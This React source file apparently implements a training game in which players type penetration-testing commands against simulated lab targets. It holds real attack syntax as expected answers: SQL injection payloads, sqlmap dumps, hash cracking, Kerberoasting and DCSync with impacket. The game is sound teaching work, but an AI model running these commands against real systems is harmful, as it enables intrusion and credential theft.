import { useState, useEffect, useRef, useCallback } from 'react'

const MISSIONS = [
  {
    id: 1, name: "INITIATION", difficulty: "EASY",
    target: "10.10.10.1", os: "Linux Ubuntu 20.04",
    briefing: "A misconfigured FTP server. Anonymous login is enabled. Get the flag.",
    steps: [
      { prompt: "Scan the target", expected: ["nmap -sV 10.10.10.1", "nmap 10.10.10.1"], hint: "Use nmap to scan the target IP", output: "PORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n80/tcp open  http    Apache 2.4.41\nOS: Linux Ubuntu 20.04" },
      { prompt: "Connect to FTP anonymously", expected: ["ftp 10.10.10.1", "ftp anonymous@10.10.10.1"], hint: "Use ftp <ip> then login as anonymous", output: "Connected to 10.10.10.1.\n220 vsftpd 3.0.3\nName: anonymous\n331 Please specify the password.\nPassword: \n230 Login successful.\nftp>" },
      { prompt: "List files on FTP", expected: ["ls", "dir", "ls -la"], hint: "List directory contents", output: "-rw-r--r-- 1 ftp ftp  42 Jan 01 flag.txt\n-rw-r--r-- 1 ftp ftp 128 Jan 01 backup.zip" },
      { prompt: "Download the flag", expected: ["get flag.txt", "mget flag.txt"], hint: "Use get <filename> to download", output: "226 Transfer complete.\nflag.txt saved." },
      { prompt: "Read the flag", expected: ["cat flag.txt", "type flag.txt"], hint: "Use cat to read the file", output: "HTB{4n0nym0us_ftp_1s_d4ng3r0us}\n\n🚩 FLAG CAPTURED!" },
    ]
  },
  {
    id: 2, name: "WEB BREACH", difficulty: "MEDIUM",
    target: "10.10.10.55", os: "Linux Debian",
    briefing: "A web app with SQL injection. Extract the admin password from the database.",
    steps: [
      { prompt: "Scan for open ports", expected: ["nmap -sV 10.10.10.55", "nmap 10.10.10.55", "nmap -p- 10.10.10.55"], hint: "nmap -sV <target>", output: "PORT   STATE SERVICE\n80/tcp open  http Apache 2.4\n3306/tcp open mysql MySQL 5.7" },
      { prompt: "Find web directories", expected: ["gobuster dir -u http://10.10.10.55 -w wordlist.txt", "gobuster dir -u http://10.10.10.55", "ffuf -u http://10.10.10.55/FUZZ -w wordlist.txt"], hint: "Use gobuster or ffuf to find hidden dirs", output: "/admin (Status: 200)\n/login (Status: 200)\n/backup (Status: 403)" },
      { prompt: "Test login for SQL injection", expected: ["sqlmap -u http://10.10.10.55/login --data='user=admin&pass=test'", "sqlmap -u http://10.10.10.55/login", "' OR 1=1--"], hint: "Try sqlmap or manual SQLi: ' OR 1=1--", output: "[+] Parameter 'user' is vulnerable!\n[+] Backend DBMS: MySQL\n[+] Database: webapp" },
      { prompt: "Dump the users table", expected: ["sqlmap -u http://10.10.10.55/login --dump -T users", "sqlmap -u http://10.10.10.55/login --dump", "' UNION SELECT username,password FROM users--"], hint: "Use sqlmap --dump or UNION SELECT", output: "Table: users\n+-------+----------------------------------+\n| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |\n+-------+----------------------------------+" },
      { prompt: "Crack the MD5 hash", expected: ["hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 rockyou.txt", "john --wordlist=rockyou.txt hash.txt", "hashcat -m 0 hash.txt rockyou.txt"], hint: "Use hashcat -m 0 for MD5", output: "5f4dcc3b5aa765d61d8327deb882cf99:password\n\nCredentials: admin:password\n🚩 FLAG CAPTURED!" },
    ]
  },
  {
    id: 3, name: "SHADOW DOMAIN", difficulty: "HARD",
    target: "10.10.10.100", os: "Windows Server 2019 (DC)",
    briefing: "Active Directory domain controller. Kerberoast a service account and escalate to Domain Admin.",
    steps: [
      { prompt: "Enumerate the domain controller", expected: ["nmap -p 88,389,445 10.10.10.100", "nmap -sV 10.10.10.100", "nmap 10.10.10.100"], hint: "Scan for AD ports: 88 (Kerberos), 389 (LDAP), 445 (SMB)", output: "88/tcp  open kerberos-sec\n389/tcp open ldap\n445/tcp open microsoft-ds\nDomain: CORP.LOCAL" },
      { prompt: "Enumerate domain users", expected: ["kerbrute userenum users.txt --dc 10.10.10.100 -d corp.local", "crackmapexec smb 10.10.10.100 -u '' -p '' --users", "enum4linux -a 10.10.10.100"], hint: "Use kerbrute or crackmapexec to find users", output: "[+] VALID USERNAME: john@corp.local\n[+] VALID USERNAME: svc_backup@corp.local\n[+] VALID USERNAME: administrator@corp.local" },
      { prompt: "Kerberoast service accounts", expected: ["impacket-GetUserSPNs corp.local/john:password123 -dc-ip 10.10.10.100 -request", "GetUserSPNs.py corp.local/john:password123 -dc-ip 10.10.10.100 -request"], hint: "impacket-GetUserSPNs domain/user:pass -dc-ip <ip> -request", output: "$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01*$a3f...[HASH TRUNCATED]\nSaved to kerberoast.txt" },
      { prompt: "Crack the Kerberos ticket", expected: ["hashcat -m 13100 kerberoast.txt rockyou.txt", "john --wordlist=rockyou.txt kerberoast.txt", "hashcat -m 13100 -a 0 kerberoast.txt rockyou.txt"], hint: "hashcat -m 13100 for Kerberos TGS", output: "$krb5tgs$23$*svc_backup...:Backup2023!\n\nCredentials: svc_backup:Backup2023!" },
      { prompt: "Dump domain hashes (DCSync)", expected: ["impacket-secretsdump corp.local/svc_backup:Backup2023!@10.10.10.100", "secretsdump.py corp.local/svc_backup:Backup2023!@10.10.10.100"], hint: "impacket-secretsdump domain/user:pass@dc-ip", output: "Administrator:500:aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b4a4f5f5b6:::\nsvc_backup:1103:...\n\n🚩 DOMAIN COMPROMISED! FLAG: HTB{k3rb3r0ast_t0_d0m41n_4dm1n}" },
    ]
  },
]

const TYPOS = { 'namp': 'nmap', 'cta': 'cat', 'sl': 'ls', 'gobluster': 'gobuster', 'sqlamp': 'sqlmap' }

export default function HackGame() {
  const [screen, setScreen] = useState('menu') // menu | game | win | lose
  const [mission, setMission] = useState(null)
  const [step, setStep] = useState(0)
  const [input, setInput] = useState('')
  const [history, setHistory] = useState([])
  const [timeLeft, setTimeLeft] = useState(0)
  const [shake, setShake] = useState(false)
  const [glitch, setGlitch] = useState(false)
  const inputRef = useRef(null)
  const termRef = useRef(null)
  const timerRef = useRef(null)

  const startMission = (m) => {
    setMission(m)
    setStep(0)
    setInput('')
    setHistory([
      { type: 'system', text: `╔══════════════════════════════════════╗` },
      { type: 'system', text: `  MISSION: ${m.name}  [${m.difficulty}]` },
      { type: 'system', text: `  TARGET:  ${m.target}` },
      { type: 'system', text: `  OS:      ${m.os}` },
      { type: 'system', text: `╚══════════════════════════════════════╝` },
      { type: 'info', text: m.briefing },
      { type: 'prompt-hint', text: `OBJECTIVE: ${m.steps[0].prompt}` },
    ])
    setTimeLeft(m.steps.length * 45)
    setScreen('game')
  }

  useEffect(() => {
    if (screen !== 'game') return
    timerRef.current = setInterval(() => {
      setTimeLeft(t => {
        if (t <= 1) { clearInterval(timerRef.current); setScreen('lose'); return 0 }
        return t - 1
      })
    }, 1000)
    return () => clearInterval(timerRef.current)
  }, [screen])

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
  }, [history])

  useEffect(() => {
    if (screen === 'game') inputRef.current?.focus()
  }, [screen, step])

  const submit = useCallback(() => {
    if (!input.trim() || !mission) return
    const cmd = input.trim()
    const currentStep = mission.steps[step]

    // Check for typo suggestions
    const firstWord = cmd.split(' ')[0]
    const typoFix = TYPOS[firstWord]

    const newHistory = [...history, { type: 'cmd', text: `root@kali:~# ${cmd}` }]

    const isCorrect = currentStep.expected.some(e =>
      cmd.toLowerCase().includes(e.toLowerCase().split(' ')[0]) &&
      (e.split(' ').length === 1 || cmd.toLowerCase().includes(e.toLowerCase().split(' ').slice(-1)[0]))
    )

    if (isCorrect) {
      newHistory.push({ type: 'output', text: currentStep.output })
      const nextStep = step + 1
      if (nextStep >= mission.steps.length) {
        clearInterval(timerRef.current)
        setHistory(newHistory)
        setInput('')
        setTimeout(() => setScreen('win'), 800)
        return
      }
      newHistory.push({ type: 'prompt-hint', text: `\nOBJECTIVE: ${mission.steps[nextStep].prompt}` })
      setStep(nextStep)
      setGlitch(true)
      setTimeout(() => setGlitch(false), 400)
    } else {
      if (typoFix) {
        newHistory.push({ type: 'error', text: `bash: ${firstWord}: command not found. Did you mean '${typoFix}'?` })
      } else {
        newHistory.push({ type: 'error', text: `bash: ${cmd.split(' ')[0]}: command not found` })
        newHistory.push({ type: 'hint', text: `💡 Hint: ${currentStep.hint}` })
        setShake(true)
        setTimeout(() => setShake(false), 400)
        setTimeLeft(t => Math.max(0, t - 10))
      }
    }

    setHistory(newHistory)
    setInput('')
  }, [input, mission, step, history])

  const timerColor = timeLeft < 30 ? '#ff3333' : timeLeft < 60 ? '#ff9900' : '#00ff99'

  if (screen === 'menu') return (
    <div style={{ maxWidth: '700px' }}>
      <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
        <div style={{ fontSize: '1.5rem', fontWeight: 700, color: '#00ff99', textShadow: '0 0 20px #00ff99', letterSpacing: '0.2em', marginBottom: '0.5rem' }}>
          ☠ HACK THE BOX SIMULATOR
        </div>
        <div style={{ fontSize: '0.7rem', color: '#444' }}>Type real commands to complete missions. Wrong commands cost time.</div>
      </div>
      <div style={{ display: 'flex', flexDirection: 'column', gap: '0.75rem' }}>
        {MISSIONS.map(m => (
          <button key={m.id} onClick={() => startMission(m)} style={{ background: '#0d0d0d', border: '1px solid #1a1a1a', color: '#00ff99', fontFamily: 'inherit', padding: '1rem 1.25rem', cursor: 'pointer', textAlign: 'left', transition: 'all 0.2s' }}
            onMouseEnter={e => e.currentTarget.style.borderColor = '#00ff99'}
            onMouseLeave={e => e.currentTarget.style.borderColor = '#1a1a1a'}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <span style={{ fontWeight: 700, fontSize: '0.85rem' }}>MISSION {m.id}: {m.name}</span>
              <span style={{ fontSize: '0.65rem', color: m.difficulty === 'EASY' ? '#00ff99' : m.difficulty === 'MEDIUM' ? '#ff9900' : '#ff3333', border: `1px solid currentColor`, padding: '1px 6px' }}>{m.difficulty}</span>
            </div>
            <div style={{ fontSize: '0.68rem', color: '#555', marginTop: '0.3rem' }}>{m.briefing}</div>
            <div style={{ fontSize: '0.65rem', color: '#333', marginTop: '0.25rem' }}>Target: {m.target} · {m.steps.length} steps · {m.steps.length * 45}s</div>
          </button>
        ))}
      </div>
    </div>
  )

  if (screen === 'win') return (
    <div style={{ textAlign: 'center', padding: '3rem' }}>
      <div style={{ fontSize: '2rem', marginBottom: '1rem', animation: 'pulse-glow 1s infinite' }}>🚩</div>
      <div style={{ fontSize: '1.2rem', fontWeight: 700, color: '#00ff99', textShadow: '0 0 30px #00ff99', marginBottom: '0.5rem' }}>MISSION COMPLETE</div>
      <div style={{ fontSize: '0.75rem', color: '#555', marginBottom: '2rem' }}>Time remaining: {timeLeft}s</div>
      <button onClick={() => setScreen('menu')} style={{ background: 'rgba(0,255,153,0.1)', border: '1px solid #00ff99', color: '#00ff99', fontFamily: 'inherit', fontSize: '0.75rem', padding: '0.5rem 2rem', cursor: 'pointer' }}>
        BACK TO MISSIONS
      </button>
    </div>
  )

  if (screen === 'lose') return (
    <div style={{ textAlign: 'center', padding: '3rem' }}>
      <div style={{ fontSize: '2rem', marginBottom: '1rem' }}>💀</div>
      <div style={{ fontSize: '1.2rem', fontWeight: 700, color: '#ff3333', marginBottom: '0.5rem' }}>CONNECTION TERMINATED</div>
      <div style={{ fontSize: '0.75rem', color: '#555', marginBottom: '2rem' }}>You ran out of time. The target detected your intrusion.</div>
      <button onClick={() => startMission(mission)} style={{ background: 'rgba(255,51,51,0.1)', border: '1px solid #ff3333', color: '#ff3333', fontFamily: 'inherit', fontSize: '0.75rem', padding: '0.5rem 1.5rem', cursor: 'pointer', marginRight: '0.75rem' }}>
        RETRY
      </button>
      <button onClick={() => setScreen('menu')} style={{ background: 'none', border: '1px solid #1a1a1a', color: '#555', fontFamily: 'inherit', fontSize: '0.75rem', padding: '0.5rem 1.5rem', cursor: 'pointer' }}>
        MENU
      </button>
    </div>
  )

  return (
    <div style={{ display: 'flex', flexDirection: 'column', height: 'calc(100vh - 160px)' }}>
      {/* HUD */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '0.4rem 0.75rem', background: '#0d0d0d', border: '1px solid #1a1a1a', marginBottom: '0.5rem', fontSize: '0.7rem' }}>
        <span style={{ color: '#444' }}>MISSION: <span style={{ color: '#00ff99' }}>{mission.name}</span></span>
        <span style={{ color: '#444' }}>STEP: <span style={{ color: '#00ff99' }}>{step + 1}/{mission.steps.length}</span></span>
        <span style={{ color: '#444' }}>TARGET: <span style={{ color: '#00ff99' }}>{mission.target}</span></span>
        <span style={{ color: timerColor, fontWeight: 700, fontSize: '0.85rem', textShadow: timeLeft < 30 ? '0 0 10px #ff3333' : 'none' }}>
          ⏱ {String(Math.floor(timeLeft / 60)).padStart(2, '0')}:{String(timeLeft % 60).padStart(2, '0')}
        </span>
        <div style={{ width: '120px', height: '4px', background: '#1a1a1a' }}>
          <div style={{ height: '100%', width: `${(step / mission.steps.length) * 100}%`, background: '#00ff99', transition: 'width 0.3s' }} />
        </div>
        <button onClick={() => { clearInterval(timerRef.current); setScreen('menu') }} style={{ background: 'none', border: '1px solid #2a0000', color: '#ff3333', fontFamily: 'inherit', fontSize: '0.6rem', padding: '1px 6px', cursor: 'pointer' }}>ABORT</button>
      </div>

      {/* Terminal */}
      <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{ flex: 1, background: '#030303', border: '1px solid #1a1a1a', padding: '0.75rem', overflowY: 'auto', cursor: 'text', fontFamily: 'inherit', fontSize: '0.75rem' }}>
        {history.map((h, i) => (
          <div key={i} style={{
            color: h.type === 'cmd' ? '#00ff99' : h.type === 'error' ? '#ff3333' : h.type === 'hint' ? '#ff9900' : h.type === 'prompt-hint' ? '#00ccff' : h.type === 'system' ? '#444' : '#888',
            marginBottom: '2px', whiteSpace: 'pre-wrap', lineHeight: 1.5,
            ...(h.type === 'prompt-hint' ? { fontWeight: 700, marginTop: '0.5rem' } : {})
          }}>{h.text}</div>
        ))}

        {/* Input line */}
        <div style={{ display: 'flex', alignItems: 'center', marginTop: '0.25rem' }} className={shake ? 'shake' : glitch ? 'glitch' : ''}>
          <span style={{ color: '#00ff99', marginRight: '0.5rem', flexShrink: 0 }}>root@kali:~#</span>
          <input
            ref={inputRef}
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') submit() }}
            style={{ flex: 1, background: 'none', border: 'none', color: '#00ff99', fontFamily: 'inherit', fontSize: '0.75rem', outline: 'none', caretColor: '#00ff99' }}
            autoComplete="off"
            spellCheck={false}
          />
        </div>
      </div>

      <style>{`
        @keyframes shake {
          0%,100%{transform:translateX(0)} 25%{transform:translateX(-4px)} 75%{transform:translateX(4px)}
        }
        .shake { animation: shake 0.3s ease; }
      `}</style>
    </div>
  )
}
